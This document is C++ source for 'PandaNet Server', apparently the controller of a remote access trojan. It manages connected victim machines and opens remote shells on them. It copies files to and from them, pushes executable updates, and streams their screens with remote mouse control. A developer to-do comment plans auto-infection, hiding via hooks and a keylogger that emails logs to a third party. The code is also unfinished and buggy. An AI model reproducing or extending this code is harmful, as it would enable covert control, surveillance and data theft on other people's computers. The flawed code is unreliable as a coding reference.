#include <iostream>

#define WIN32_MEAN_AND_LEAN
#include <WinSock2.h>
#include <Psapi.h>
#include <windows.h>
#include "zlib.h"

#include "zconf.h"
#include "zlib.h"
#include <string>
#include <sstream>
#include <vector>
#include <string.h>
#include <math.h>
#include <conio.h>
//SecondServer.exe
#include <stdio.h>
#include <stdlib.h>

#include "Network.h"
using namespace std; 
#define MAX_THREADS 10

#define PULSE_TIME 2000


struct ClientInfo{
    SOCKET sClient;
    SOCKADDR_IN from;
    HANDLE hThread;
    int threadNum;
    int active;
    int consoleActive;
    char *computerName;
    int versionNumber;
	int VNCFLAG; // 1 for on 0 for off
	int VNCAttach; // 0 for not on 1 for not attached 2 attached
	int VNCThreads; // total sockets meant to be used
	int VNCThreadsWaiting; // sockets still waiting to connect
};

struct VNCInfo{
	HINSTANCE hInstance;
	int iCmdShow;
	int ID;
	int quality; //0 for worst 100 for best
	SOCKET VNCSocks[10]; //Max of 10 socket connections
	int SockNum; //0-9
	int Pixelx;
	int Pixely;
	HWND MyWindow;
};

void  mooo(void*);
void StartVNCTransfer(int,int,int);
int WaitingFlag=0;
int ProcessingVncID=0;
int VNCSockConnectedFlag=0;
int pause=0;
//SOCKET VNCSocks[100];
/* Announcements!!
cout and printf both work.....
that is all.
*/

 /* 2/1/2010
To do:
1. Some better Clean up (delete's and such)
2. A few dugging things on the list.
3. Make encodings stop fucking talking in plain text (do b4 release ok for debugging purposes)
number 1-26 instead of letters will make it faster.--- use enum
4. AutoInfection
5. Hooking adding hiding
6. Optional KeyLogg which emails to 3d party email system
7. SAFE operations not limited but also including high level encryption algorithms also make safe 
against volatile attacks (malformed packet proof,Irregular send recv cycles,,,,,,,,,,ect)
8. 100% gui base that can minimize down to the small bar 
9. ICMP + mininmap port scanner ( BTW IT IS OPEN SCOURCE)
*/


void serverShell(void *);
void clientHandler(void *);
void asynchShellOutput(void *);

int currentVersion = 1330;

int hostPort = 1526;

int activeThreads = 0, totalThreads = 0;
int acceptorActive = 1;

SOCKET PassingSocket;
struct ClientInfo clientList[MAX_THREADS];
int VNCThreadTimeOut=0;

int main(){
    test();

    SetConsoleTitle(L"PandaNet Server");
    SOCKET server;
    SOCKADDR_IN local;
    WSADATA wsaData;
    int wsaret = WSAStartup(MAKEWORD(2,2), &wsaData);
    if(wsaret != 0){
       // printf("Network.c Error: WinSock failed to launch.\n");
		cout<<"Network.c Error: WinSock failed to launch.\n";
        return 0;
    }
    local.sin_family = AF_INET;//address family
    local.sin_addr.s_addr = INADDR_ANY;//wild card IP address
    local.sin_port = htons(hostPort);//port to use
    if((server = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET){
      //  printf("Network.c Error: Socket is invalid.\n");
		cout<<"Network.c Error: Socket is invalid.\n";
        return 0;
    }
    if(bind(server, (SOCKADDR*)&local, sizeof(local)) != 0){
      //  printf("Network.c Error: Socket binding failed.\n");
		cout<<"Network.c Error: Socket binding failed.\n";
        return 0;
    }
    if(listen(server, 10) != 0){
    //    printf("Network.c Error: Listening failed... somehow...\n");
		cout<<"Network.c Error: Listening failed... somehow...\n";
        return 0;
    }

   // printf("Server made!\n");
	cout<< "Server made!\n";
    SOCKET client;
    SOCKADDR_IN from;
    int fromlen = sizeof(from);

   _beginthread(serverShell, 0, &server);
   
  
    while(1){
        while(acceptorActive){
       //     printf("Acceptor: Waiting for Connections...\n");
			char *GiveClientID=new char[100];

			cout<<"Acceptor: Waiting for Connections...\n";
            client = accept(server, (struct sockaddr*)&from, &fromlen);
			cout<<"Acceptor: Valid connection from"<< inet_ntoa(from.sin_addr)<<"\n";
               
			
			if (!1){
				
			}else if (client != INVALID_SOCKET && activeThreads < MAX_THREADS){
				char * Dontcare=new char[100];
				cout<<"Its right here isnt it?"<<endl;
				cout<<"Waiting Flag status:"<<WaitingFlag<<endl;	
				Dontcare=recvData(client); // why does this not work?
				cout<<"IMPORTANT INFO IF IM NOT HERE IM BREAK:"<<Dontcare<<endl;
				if (WaitingFlag==1){

	
					// throw the accept to VNC Client
					cout<<"PLEASE BE HERE!"<<endl;
					
				 if (!strncmp(Dontcare,"VNCSOCKET",strlen("VNCSOCKET"))){
					 VNCSockConnectedFlag=1;
					 int ThreadCare=atoi(&Dontcare[9]); // ID of SOCKET
					 cout<<"VNC SOCKET WITH ID OF"<<ThreadCare<<endl;
					 ProcessingVncID=ThreadCare;
					 
			
					PassingSocket=client;		 
					pause=0;
					Sleep(10); //waiting for things to catch up (just in case)
					 // what to do here?.... check who wants an attachment?

				 }else{
					 // oops i got a regular client MY B.
					 if (client != INVALID_SOCKET && activeThreads < MAX_THREADS){
				
              //  printf("Acceptor: Valid connection from %s, Launching clientHandler thread %d.\n", inet_ntoa(from.sin_addr), totalThreads);
				cout<<"Acceptor: Valid connection from"<< inet_ntoa(from.sin_addr)<<", Launching clientHandler thread "<< totalThreads<<"\n";
                activeThreads++;
                totalThreads++;
                int i;
                for(i = 0; i < MAX_THREADS; i++){
                    if (!clientList[i].active){
                        
                        clientList[i].sClient = client;
                        clientList[i].threadNum = totalThreads;
                        clientList[i].from = from;
                        clientList[i].active = 1;
                        clientList[i].consoleActive = 0;
						clientList[i].VNCFLAG=0;
						clientList[i].VNCAttach=0;
                        CloseHandle(clientList[i].hThread);
						itoa(clientList[i].threadNum,GiveClientID,10);
						cout<<GiveClientID<<endl;
						sendData(client,GiveClientID,strlen(GiveClientID)); // THEY WANT THIER ID
                        clientList[i].hThread = (HANDLE)_beginthread(clientHandler, 0, &clientList[i]);
                        break;

							}
						}
					 }
				}
				

			}else{
              //  printf("Acceptor: Valid connection from %s, Launching clientHandler thread %d.\n", inet_ntoa(from.sin_addr), totalThreads);
				cout<<"Acceptor: Valid connection from"<< inet_ntoa(from.sin_addr)<<", Launching clientHandler thread "<< totalThreads<<"\n";
                activeThreads++;
                totalThreads++;
                int i;
				
                for(i = 0; i < 10; i++){
                    if (!clientList[i].active){
						//cout<<"Threads ID:"<<clientList[i].threadNum<<endl;
						
                        clientList[i].sClient = client;
                        clientList[i].threadNum = totalThreads;
                        clientList[i].from = from;
                        clientList[i].active = 1;
                        clientList[i].consoleActive = 0;
						clientList[i].VNCFLAG=0;
						clientList[i].VNCAttach=0;
                        CloseHandle(clientList[i].hThread);
						itoa(clientList[i].threadNum,GiveClientID,10);
						cout<<GiveClientID<<endl;
						sendData(client,GiveClientID,strlen(GiveClientID)); // THEY WANT THIER ID
                        clientList[i].hThread = (HANDLE)_beginthread(clientHandler, 0, &clientList[i]);
                        break;
                    }
                }
				
				}
				delete [] Dontcare;
            }
        }
    }
//    printf("holy crap, son! Connection!\n");
//    printf("Who IS this!?\nComputer: %s:%d...?\n", inet_ntoa(from.sin_addr), from.sin_port);
//    char *in = recvData(client);
//    printf("\nRECIEVED!\n%s\n", in);
//    free(in);
//    sendData(client, "Thinguins!", strlen("Thinguins!"));
//    printf("DONE============================\n");
//    _getch();

    closesocket(server);
    WSACleanup();
    return 0;
}

// this thread is a tarp... just sayin... could be a lot safer
void serverShell(void *arg){
    SOCKET *server = (SOCKET*) arg; 
    char userIn[512];
 cout<<"PandaNet 2 Server Shell\nBy Team Panda\n\nPress any key to bring up prompt.\n";
    while (1){
	/*	
        if (_getch() != 13){//bring up prompt if [ENTER] is pressed
            continue;
       }
	  */ 
       cout<<"\nServer Shell\n> ";
        gets(userIn);

        if (!strncmp(userIn, "exit", 4)){
           cout<<"EXIT: Are you sure? (y/n) ";
            gets(userIn);
            if (!strncmp(userIn, "y", 1)){
               cout<<"EXIT: Seriously, do you really want to do this? (y/n) ";
                gets(userIn);
                if (!strncmp(userIn, "y", 1)){
                    cout<<"EXIT: Last chance to not make an ass of yourself! Exit? (type 1526) ";
                    gets(userIn);
                    if (!strncmp(userIn, "1526", 4)){
                        cout<<"\nExiting Server Shell Loop.\n";
                        break;
                    }
                }
            }

       }else if (!strcmp(userIn, "VNC /?")){
		   cout<<" To use type VNC then -c and then client number. \n Other options include -q then quality number 0-100 \n Also -s # sets number of sockets used \nEx. VNC 1 would call for vnc on shell 1"<<endl;
		}else if (!strncmp(userIn, "VNC", 6)){
		  cout<<" To use type VNC then -c and then client number. \n Other options include -q then quality number 0-100 \n Also -s # sets number of sockets used \nEx. VNC 1 would call for vnc on shell 1"<<endl;
	
		}else if (!strncmp(userIn, "VNC -c", 6)){
			int ShellNumber;
			ShellNumber=atoi(&userIn[6]);
			cout<<"SHELL NUM"<<ShellNumber<<endl;
			int NumOfSocks=0;
			int Quality=0;
			cout<<"Enter Number of sockets to use (0 for default):";
			cin>>NumOfSocks;
			cout<<"Enter Quality Number(0-100)"<<endl;
			cin>>Quality;
			if (Quality>100||Quality<0){
				Quality=50;

			}
				
		//	cin.flush();
			//if INVALID INPUT......
			if(NumOfSocks==0){
				NumOfSocks=2;


			}

			if (ShellNumber==NULL){
				cout<<"Sorry but something really went wrong. Did you input a number? blame windows please!"<<endl;

			}else if (ShellNumber>0){
				cout<< "Requesting VNC socket from Client "<<ShellNumber<<"...."<<endl;
				StartVNCTransfer(ShellNumber,NumOfSocks,Quality);
			}else{
				cout<< "INVALID NUMBER NUST BE > THAN 0"<<endl;
			}
		}else if (!strncmp(userIn, "VNCCLOSE -c", 11)){
			int num=atoi(&userIn[12]);
			cout<<"Attempting to close VNC Sockets with client:"<<num<<endl;
			//WHOLE LOTS OF CLEAN UP HERE!! 

        }else if (!strncmp(userIn, "help", 4)){
            ///TODO: ADD HALP COMMANDS HERE!
            cout<<"Valid Commands: \nexit, help, list, acceptor, dc, dcall, shell, VNC.\nfor more information try /? \n";
	
       }else if (!strncmp(userIn, "list", 4)){
            cout<<"Listing connected Clients:\n";
            int i;
            for(i = 0; i < MAX_THREADS; i++){
                if(clientList[i].active == 1){
                    //uummmmmmmmm 
					printf("Client #%d:\n"
                           "Name:\t%s\n"
                           "Ver:\t%d\n"
                           "IP:\t%s\n"
                           "Port:\t%d\n", clientList[i].threadNum, clientList[i].computerName, clientList[i].versionNumber, inet_ntoa(clientList[i].from.sin_addr), clientList[i].from.sin_port);
                }
            }
            printf("\nFinished listing Clients.\n");

        }else if (!strncmp(userIn, "acceptor", 8)){
            acceptorActive = !acceptorActive;
            printf("Toggling Acceptor status to: %d\n", acceptorActive);
        }else if (!strncmp(userIn, "shell", 5)){
            int threadNum = atoi(&userIn[6]);
            printf("Launching Shell to Client #%d...\n", threadNum);
            if(threadNum){
                int i, found = 0;
                for(i = 0; i < 10; i++){
                    if(clientList[i].threadNum == threadNum){
                        clientList[i].consoleActive = 1;
                        found = 1;
                        break;
                    }
                }

                if(!found){
                    printf("Could not launch Shell to Client #%d\n", threadNum);
                }else{
                    while(clientList[i].consoleActive){
                        Sleep(500);
                    }
                }
            }else{
                printf("Invalid Client Number.\n");
            }


        }else if(!strncmp(userIn, "dc", 2)){
            int threadNum = atoi(&userIn[3]);
            printf("Disconnecting Client #%d...\n", threadNum);
            int i;
            for(i = 0; i < 10; i++){
                if(clientList[i].threadNum == threadNum){
                    clientList[i].active = 0;
                    Sleep(500);
                    DWORD exitCode;
                    GetExitCodeThread(clientList[i].hThread, &exitCode);
                    TerminateThread(clientList[i].hThread, exitCode);
                    CloseHandle(clientList[i].hThread);
                    break;
                }
            }


        }else{
            printf("Invalid command: %s\n", userIn);

        }


        printf("\nServer Shell Command Processed.\n");
    }
    printf("\nServer Shell Closing...\n");

    acceptorActive = 0;
    closesocket(*server);
    WSACleanup();
    printf("Press any key to Close.\n");
    _getch();

    exit(0);



}

void clientHandler(void *arg){
    struct ClientInfo *info = (ClientInfo*)arg;
   
   // Order of things:
   // Get computer's header: Name, version number
   //     Copy new version to computer if necessary, disconnect.
   // proceed to interpret commands and such.

    
    //1) version number
    //2) computer name
    //3) return update command or go-ahead
    //3a) new copy of program if necessary.
    info->versionNumber = atoi(recvData(info->sClient));
    info->computerName = recvData(info->sClient);

    if (info->versionNumber < currentVersion){
        //Squawk! Update client!
        FILE *updateFile = fopen("update\\update.exe", "rb");
        if(updateFile != NULL){


            sendData(info->sClient, "updateclient", strlen("updateclient"));
            char * response = recvData(info->sClient);
            if(!strncmp("updateready", response, 11)){
                sendFile(info->sClient, updateFile);
                fclose(updateFile);
                printf("Update successful. Disconnecting...\n");
                info->active = 0;
            }else{
                printf("Warning: Thread %d: Client failed to save update file!\n");
            }
            free(response);
        }else{
            printf("Warning: Thread %d: Server failed to load update file!\n");
        }

    }


    int heartbeatCycle = 0;

    while(info->active){
        Sleep(100);
		/*
        if(heartbeatCycle++ >= PULSE_TIME / 100){
            sendData(info->sClient, "ping", strlen("ping"));
            char *in = recvData(info->sClient);
            if(in == NULL){
                printf("Warning: Thread %d: Connection Interrupted.\n", info->threadNum);
                info->active = 0;
                break;
            }else{
                free(in);
                heartbeatCycle = 0;
            }


        }
		*/
        if(info->consoleActive){
            printf("Shell Active. Type 'exit' at any time to return to server shell.\n");
            sendData(info->sClient, "makeshell", strlen("makeshell"));
            HANDLE asynchReader = (HANDLE)_beginthread(asynchShellOutput, 0, info); // this is dumb.

            while(info->consoleActive){

                char userIn[512];
                gets(userIn);

                if(!strncmp(userIn, "info", 4)){//Catching server-side commands
                    printf("Connection Information:\n\tThread Number: %d\n\tComputer Name: %s\n\tIP: %s\n\tPort: %d\n",
                           info->threadNum, info->computerName, inet_ntoa(info->from.sin_addr), info->from.sin_port);

                }else if(!strncmp(userIn, "localdir", 8)){
                    system("dir");
                    sendData(info->sClient, "\n", strlen("\n"));

                }else if(!strncmp(userIn, "copyto", 6)){
                    ///1) get two params: local file and client file
                    ///2) if valid, alert client, get client's availability.
                    ///3) if valid, sendFile!
                    DWORD exitCode;
                    GetExitCodeThread(asynchReader, &exitCode);
                    TerminateThread(asynchReader, exitCode);

                    printf("Enter local file name: ");
                    char filename[512];
                    gets(filename);
                    FILE *localFile = fopen(filename, "rb");
                    if(localFile != NULL){
                        sendData(info->sClient, userIn, sizeof(userIn));
                        char *validity = recvData(info->sClient);
                        if(!strncmp(validity, "VALID", 5)){
                            printf("Remote file is valid!\n");
                            sendFile(info->sClient, localFile);
                            fclose(localFile);

                        }else{
                            printf("Remote file is not valid!\n");
                        }

                        if(validity != NULL){
                            free(validity);
                        }
                    }else{
                        printf("Local file does not exist!\n");
                    }
                    asynchReader = (HANDLE)_beginthread(asynchShellOutput, 0, info);

                }else if(!strncmp(userIn, "copyfrom", 8)){
                    //copy file from client
                    ///1) get two params: local file and client file.
                    ///2) if local file is valid, alert client.
                    ///3) if client acknowledges as valid file, recvFile and save!
                    DWORD exitCode;
                    GetExitCodeThread(asynchReader, &exitCode);
                    TerminateThread(asynchReader, exitCode);

                    printf("Enter local file name: ");
                    char filename[512];
                    gets(filename);
                    FILE *localFile = fopen(filename, "wb");
                    if(localFile != NULL){
                        sendData(info->sClient, userIn, sizeof(userIn));
                        char *validity = recvData(info->sClient);
                        if(!strncmp(validity, "VALID", 5)){
                            printf("Remote file is valid!\n");
                            recvFile(info->sClient, localFile);
                            fclose(localFile);

                        }else{
                            printf("Remote file is not valid!\n");
                        }
                        if(validity != NULL){
                            free(validity);
                        }
                    }else{
                        printf("Local file cannot be made!\n");
                    }
                    asynchReader = (HANDLE)_beginthread(asynchShellOutput, 0, info);

                }else{
                    sendData(info->sClient, userIn, strlen(userIn));
                    if(!strncmp(userIn, "exit", 4)){//catching tandem commands
                        printf("Exiting Client #%d Shell...\n", info->threadNum);
                        info->consoleActive = 0;

                        DWORD exitCode;
                        GetExitCodeThread(asynchReader, &exitCode);
                        TerminateThread(asynchReader, exitCode);

                        break;
                    }


                }

            }
        }

    }



}

SOCKET testSocks;

// 1. we dont need this.
//	2. if we wanted this it could be so very much smarter.

void asynchShellOutput(void *arg){
    struct ClientInfo *info = (ClientInfo*) arg;
    while(info->consoleActive){
        char *in = recvData(info->sClient);
        if(in != NULL){
            printf("%s", in);
            //delete[] in;
        }else{
            printf("Warning: Connection Interrupted.\n");
            info->consoleActive = 0;
            info->active = 0;
            break;
        }

    }

}


struct VNCInfo PassedInfo[200]; //max vnc sessions at once remember to clean up...
int PassedInfoUsed=0;

void StartVNCTransfer(int ShellNum, int SockNum, int Quality){
	// STEP 1 DOES THE SHELL EXSIST
	//-----------//STEP 2 AM I AN MY OWN THREAD?
	// STEP 3 Make a socket for image transfers.
	//STEP 4 DISSCONNECT ON LOSS OF SHELL

	
	int notFound=0;
	int TimeOut=30000;
	for (int i=0;i<totalThreads;i++){
		if (ShellNum== clientList[i].threadNum){
			
			cout<<"Client Found!\n";
			SOCKET ClientSock=clientList[i].sClient;
			// Start some flags here
			WaitingFlag=1;
			sendData(ClientSock,"VncStart",strlen("VncStart"));
			
			char * RequestResponse=recvData(ClientSock);
			cout<<RequestResponse<<endl;
			if(!strcmp(RequestResponse,"Attempting")){
			// crap load of flags here
				// send more data...
			char* tempSockNum=new char[5];
			char* tempQualityNum=new char[5];
			itoa(SockNum,tempSockNum,10);
			itoa(Quality,tempQualityNum,10);
			
			sendData(ClientSock,tempSockNum,5);
			sendData(ClientSock,tempQualityNum,5);
			//take in screen size

			//size of screen x
			PassedInfo[PassedInfoUsed].Pixelx=atoi(recvData(ClientSock));
			//size of screen y
			PassedInfo[PassedInfoUsed].Pixely=atoi(recvData(ClientSock));

			clientList[i].VNCFLAG=1;
			clientList[i].VNCAttach=0;
			
			clientList[i].VNCThreads=SockNum;
			clientList[i].VNCThreadsWaiting=SockNum;
			//cout<<"Number of sockets attempting:"
			int Count=0;
			PassedInfo[PassedInfoUsed].SockNum=SockNum;
			//PassedInfo.VNCSocks=new SOCKET[SockNum];
			while(!VNCThreadTimeOut==1&&!clientList[i].VNCThreadsWaiting==0){// time out happens and we use what threads we have or all threads connect
			pause=1;
			while (pause==1){
				
				// 1 in 1 out 
				
			}
			PassedInfo[PassedInfoUsed].VNCSocks[Count]=PassingSocket;
			clientList[i].VNCThreadsWaiting--;
			Count++;
			}
			testSocks=PassedInfo[PassedInfoUsed].VNCSocks[0];
			cout<< "VNC ID:"<<ProcessingVncID<<endl;
			cout<<"IT SHOULD BE :"<<clientList[i].threadNum<<endl;
			sendData(PassedInfo[PassedInfoUsed].VNCSocks[0],"Poo",3);
			

			if (ProcessingVncID==clientList[i].threadNum){
				cout<<"We got our selves a keeper."<<endl;
				//flag to show that VNCSocket is attached.
				clientList[i].VNCAttach=2;
			
				//HINSTANCE hInstance =;
				//PassedInfo->hInstance= (HINSTANCE)GetModuleHandle(NULL);
				PassedInfo[PassedInfoUsed].iCmdShow=1;
				PassedInfo[PassedInfoUsed].ID=ShellNum;
				notFound=0;
				ProcessingVncID=NULL;
				_beginthread(mooo,0,&PassedInfo[PassedInfoUsed]);// not quite ready friend 
				// NOW WE HAVE TO SET ALL THOSE FLAGS TO OFF AGAIN!!!! 
				PassedInfoUsed++;
			}else{
				cout<<"Wrong VNC ID. What now?"<<endl;


			}
			 // show window 1= normal.
			//create process mooo(hInstance,1);

			}
			else if(!strcmp(RequestResponse,"Failed")){
			WaitingFlag=0;

			}else{
			WaitingFlag=0;
			notFound=1;
			}
			

		}
		
		

	}
	


	if (!notFound){
		cout<<"No Client with that ID found"<<endl;
	}
		

}









#include <windows.h>
#include <objidl.h>
#include <string>
#include <iostream>
#include <gdiplus.h>
#include <string.h>
using namespace Gdiplus;
#pragma comment (lib,"Gdiplus.lib")
INT GetEncoderClsid(const WCHAR* format, CLSID* pClsid);  // helper function
//Image*
void ImageCaptureAndCompress(SOCKET);
RECT rect;
HWND                hWnd;
int width=10;
int height=10;
Image* FreshImage=NULL;
//#include <gzstream.h>
int ProcessingImage=0;
     BITMAP bm;
    HDC dc;
    HDC Cdc;
    int cx;
    int cy;
	//=NULL;
int	num=0;
Image *testImage;

	Image *terseImage=NULL;
VOID OnPaint(HDC hdc,int ID,SOCKET VNCS)
{
    	if (ID==-1||VNCS==NULL){
		// do nothing geting called from some where else



	}else{
		GetWindowRect(hWnd, &rect);

		 int width = rect.right - rect.left;
		 int height = rect.bottom - rect.top;

 
		Graphics *graphics=new Graphics(hdc);


	
		ImageCaptureAndCompress(VNCS); // this can be fixed easy enough


 
		graphics->DrawImage(terseImage,0,0,width,height);
		delete graphics;
		//delete terseImage;
	
		//if(terseImage)
		//	delete terseImage;
	////delete terseImage;
		}
  //cout<<"Rendered."<<endl;
		
}


LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
//INT WINAPI mooo(void *arg)

struct PaintInfo{
	//window
	int ID;
	HWND window;
	SOCKET Sock;

};

int earase=0;
void PaintCaller(void *arg){
	int local=earase++;
	struct PaintInfo *ThisPaint=(PaintInfo*)arg;
	//cout<<"In the paint caller\n"<<endl;
	int ID=ThisPaint->ID;
	HWND hWnd=ThisPaint->window;
   HDC          hdc;
   PAINTSTRUCT  ps;
	HDC Thishdc;
	Thishdc=GetDC(hWnd);
	while (1){
		
		Sleep(10);
   // hdc = BeginPaint(hWnd, &ps);
	//	cout<<"Paint Caller Thread"<<endl;
    OnPaint(Thishdc,ID,ThisPaint->Sock);
	
	}


}


void  mooo(void *arg)
{


	struct VNCInfo *ThisVNC=(VNCInfo*)arg;
	HINSTANCE hInstance=(HINSTANCE)GetModuleHandle(NULL);
	INT iCmdShow=1;
	int ThisID=ThisVNC->ID;
	
   MSG                 msg;
   WNDCLASS            wndClass;                                                
   GdiplusStartupInput gdiplusStartupInput;
   ULONG_PTR           gdiplusToken;
   


   // Initialize GDI+.
   GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
   
   wndClass.style          = CS_HREDRAW | CS_VREDRAW;
   wndClass.lpfnWndProc    = WndProc;
   wndClass.cbClsExtra     = 0;
   wndClass.cbWndExtra     = 0;
   wndClass.hInstance      = hInstance;
   wndClass.hIcon          = LoadIcon(NULL, IDI_APPLICATION);
   wndClass.hCursor        = LoadCursor(NULL, IDC_ARROW);
   wndClass.hbrBackground  = (HBRUSH)GetStockObject(WHITE_BRUSH);
   wndClass.lpszMenuName   = NULL;
   wndClass.lpszClassName  = TEXT("GettingStarted");
   
   RegisterClass(&wndClass);
   
 
     dc=GetDC(NULL);
     Cdc=CreateCompatibleDC(dc);
     cx=GetSystemMetrics(SM_CXSCREEN);
     cy=GetSystemMetrics(SM_CYSCREEN);
  cout<<"Im up in the gui all over here!"<<endl;
  hWnd = CreateWindow(
      TEXT("GettingStarted"),   // window class name
      TEXT("Getting Started"),  // window caption
      WS_OVERLAPPEDWINDOW,      // window style
      CW_USEDEFAULT,            // initial x position
      CW_USEDEFAULT,            // initial y position
      CW_USEDEFAULT,            // initial x size
      CW_USEDEFAULT,            // initial y size
      NULL,                     // parent window handle
      NULL,                     // window menu handle
      hInstance,                // program instance handle
      NULL);                    // creation parameters
   ThisVNC->MyWindow=hWnd;   
   ShowWindow(hWnd, iCmdShow);
   UpdateWindow(hWnd);
       HDC          Thishdc;
		PAINTSTRUCT  ps;
		cout<<"Paint calls..."<<ThisVNC->SockNum<<endl;
		int countdown=ThisVNC->SockNum;
		int countup=0;
		SOCKET ThisSock;
		struct PaintInfo SentInfo[11];
		while(countdown>0){
		
		
		SentInfo[countup].ID=ThisID;
		SentInfo[countup].window=hWnd;
		SentInfo[countup].Sock=ThisVNC->VNCSocks[countup];
		_beginthread(PaintCaller,0,&SentInfo[countup]);
		countup++;
		countdown--;
		}
	   
	   while(GetMessage(&msg, NULL, 0, 0))
   {
	
	 //  HDC thisHDC=
	TranslateMessage(&msg);
    DispatchMessage(&msg);
	//  hdc = BeginPaint(hWnd, &ps);

      //EndPaint(hWnd, &ps);
	  //Sleep(160);
   }
   
   GdiplusShutdown(gdiplusToken);
   //return msg.wParam;
}  // WinMain


// loop through current socket connections till windows match
int GetSocketByWindow(HWND ThisWindow){

	
	
	int count=PassedInfoUsed;
	while (count>=0){
		if(PassedInfo[count].MyWindow==ThisWindow){
			

			return count;		//PassedInfo[count].VNCSocks[1]; // first socket now does messages too!

		}
		
		
		count--;
	}
	cout<<"FOUND NOT!"<<endl;

	// aka something is wrong.
	return NULL;
}


void SendMouseMove(int L,int x, int y,SOCKET Client){
	// 1 moved
	//2 Left down
	// 3 left up
	// 4 RT down
	// 5 RT UP
		sendData(Client,"HI",2);
	if (L==1){
		// convert to text >.<
		char *send1=new char[5];
		char *send2=new char[5];
		itoa(x,send1,10);
		itoa(y,send2,10);
		sendData(Client,"WM_MOVED",strlen("WM_MOVED"));
		sendData(Client,send1,strlen(send1));
		sendData(Client,send2,strlen(send2));



	}else if(L==2){
		sendData(Client,"WM_LDOWN",strlen("WM_LDOWN"));


	}else if(L==3){
		sendData(Client,"WM_LUP",strlen("WM_LUP"));



	}else if(L==4){
		sendData(Client,"WM_RDOWN",strlen("WM_RDOWN"));



	}else if(L==5){
		sendData(Client,"WM_RUP",strlen("WM_RUP"));


	}else{
		/// errror



	}


}
  
   
  
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, 
   WPARAM wParam, LPARAM lParam)
{
   HDC          hdc;
   PAINTSTRUCT  ps;
   POINT cursor_pos;
   int c=GetSocketByWindow(hWnd);
   
	SOCKET ControlSock=PassedInfo[c].VNCSocks[0];
   /*
 
	 if (c==NULL||c<0){


	 }else{
 
   if (ControlSock==NULL){
	   // BAD BAD!


   }else{
   */
   switch(message)
   {
   case WM_PAINT:
      hdc = BeginPaint(hWnd, &ps);
      OnPaint(hdc,-1,NULL);
      EndPaint(hWnd, &ps);
      return 0;

	  // cout<<cursor_pos.y<<","<<cursor_pos.x<<endl;
	  /// mouse inputs!-- SendMouseMove
	  // 1 moved
	//2 Left down
	// 3 left up
	// 4 RT down
	// 5 RT UP
	case WM_LBUTTONDOWN:
		GetCursorPos(&cursor_pos);
		ScreenToClient(hWnd,&cursor_pos);
		// pt *(actual/rectangle)=Pt on real
		SendMouseMove(2,cursor_pos.x*((double)PassedInfo[c].Pixelx/(double)cx),cursor_pos.y*((double)PassedInfo[c].Pixely/(double)cy),ControlSock);
		return 0;
	case WM_LBUTTONUP:
		GetCursorPos(&cursor_pos);
		ScreenToClient(hWnd,&cursor_pos);
		SendMouseMove(3,cursor_pos.x*((double)PassedInfo[c].Pixelx/(double)cx),cursor_pos.y*((double)PassedInfo[c].Pixely/(double)cy),ControlSock);
		return 0;
	case WM_RBUTTONDOWN:
		GetCursorPos(&cursor_pos);
		ScreenToClient(hWnd,&cursor_pos);
		SendMouseMove(4,cursor_pos.x*((double)PassedInfo[c].Pixelx/(double)cx),cursor_pos.y*((double)PassedInfo[c].Pixely/(double)cy),ControlSock);
		return 0;
	case WM_RBUTTONUP:
		GetCursorPos(&cursor_pos);
		ScreenToClient(hWnd,&cursor_pos);
		SendMouseMove(5,cursor_pos.x*((double)PassedInfo[c].Pixelx/(double)cx),cursor_pos.y*((double)PassedInfo[c].Pixely/(double)cy),ControlSock);
		return 0;
	case WM_MOUSEMOVE:
		GetCursorPos(&cursor_pos);
		ScreenToClient(hWnd,&cursor_pos);
		SendMouseMove(1,cursor_pos.x*((double)PassedInfo[c].Pixelx/(double)cx),cursor_pos.y*((double)PassedInfo[c].Pixely/(double)cy),ControlSock);
		return 0;
		
	case WM_DESTROY:
		cout<<"Destroyed window sorry"<<endl;
    //do more stuff here
	  PostQuitMessage(0);
      return 0;
   default:
      return DefWindowProc(hWnd, message, wParam, lParam);
   }

  
}

//Image* 

 
	ULARGE_INTEGER ulnSize;

	LARGE_INTEGER lnOffset;
void ImageCaptureAndCompress(SOCKET VNCSOCK){

	// move start up so it only runs once
  
	
	lnOffset.QuadPart = 0;
	//cout<<"Get image"<<endl;
	sendData(VNCSOCK,"GetImage",strlen("GetImage"));
	ProcessingImage=1;
	char * input=new char[1000];
	input=recvData(VNCSOCK); //times out 

	if (!strncmp(input,"SendingData",strlen("SendingData"))){

	
	char * AciiNum=new char[1000];
	AciiNum=recvData(VNCSOCK);

	int bad=0;
	ulnSize.QuadPart=atol(AciiNum);
	if (ulnSize.QuadPart<=0){
		bad=1;
		// this will be bad
	}
	delete [] AciiNum;

	char * pBuff=recvData(VNCSOCK);
	ULONG ulBytesRead=0;

	
	IStream* FreshStream=NULL;
	HRESULT hr=CreateStreamOnHGlobal(NULL, TRUE, &FreshStream);
	
	if(pBuff==NULL||ulnSize.QuadPart<1000){
		//exception!
		
	}else{
	try{
	
	HRESULT stat=FreshStream->Write(pBuff,ulnSize.QuadPart,&ulBytesRead);

	terseImage=new Image(FreshStream);
	FreshStream->Release();
//	delete pBuff;
	}catch(...){
		printf("Error thrown?!\n");


	}
		}
	
	
	}
	
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
   UINT  num = 0;          // number of image encoders
   UINT  size = 0;         // size of the image encoder array in bytes

   ImageCodecInfo* pImageCodecInfo = NULL;

   GetImageEncodersSize(&num, &size);
   if(size == 0)
      return -1;  // Failure

   pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
   if(pImageCodecInfo == NULL)
      return -1;  // Failure

   GetImageEncoders(num, size, pImageCodecInfo);

   for(UINT j = 0; j < num; ++j)
   {
      if( wcscmp(pImageCodecInfo[j].MimeType, format) == 0 )
      {
         *pClsid = pImageCodecInfo[j].Clsid;
         free(pImageCodecInfo);
         return j;  // Success
      }    
   }

   free(pImageCodecInfo);
   return -1;  // Failure
}



/*
     // Initialize GDI+.
   GdiplusStartupInput gdiplusStartupInput;
   ULONG_PTR gdiplusToken;
   GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

   CLSID             encoderClsid;
   EncoderParameters encoderParameters;
   ULONG             quality;
   Status            stat;

   // Get an image from the disk.
  // Image* image = new Image(L"Shapes.bmp");
    
    
  
   cout<<"running"<<endl;
    GetEncoderClsid(L"image/jpeg", &encoderClsid);
   encoderParameters.Count = 1;
   encoderParameters.Parameter[0].Guid = EncoderQuality;
